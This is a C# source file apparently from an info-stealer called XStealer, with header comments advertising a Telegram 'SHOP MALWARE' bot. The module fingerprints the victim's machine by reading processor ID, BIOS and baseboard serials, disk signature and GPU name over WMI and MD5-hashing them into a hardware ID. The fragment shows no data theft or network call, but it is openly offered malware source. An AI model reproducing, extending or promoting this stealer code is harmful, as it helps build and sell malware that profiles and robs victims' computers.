// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Machine
{
    using System;
    using System.Threading.Tasks;
    using Helpers;

    public static class Hwid
    {
        public static string GetData()
        {
            string result = string.Empty;
            using var Data = Task.Run(() =>
            {
                string info = string.Join("-",
                WmiEx.GetName(@"root\CIMV2", "Win32_Processor", "ProcessorId"),
                WmiEx.GetName(@"root\CIMV2", "Win32_BIOS", "SerialNumber"),
                WmiEx.GetName(@"root\CIMV2", "Win32_DiskDrive", "Signature"),
                WmiEx.GetName(@"root\CIMV2", "Win32_BaseBoard", "SerialNumber"),
                WmiEx.GetName(@"root\CIMV2", "Win32_VideoController", "Name"));
                result = FileX.GetMD5(info).ToUpper();
            });
            Data.Wait();
            return !string.IsNullOrEmpty(result) ? result : Guid.NewGuid().ToString();
        }
    }
}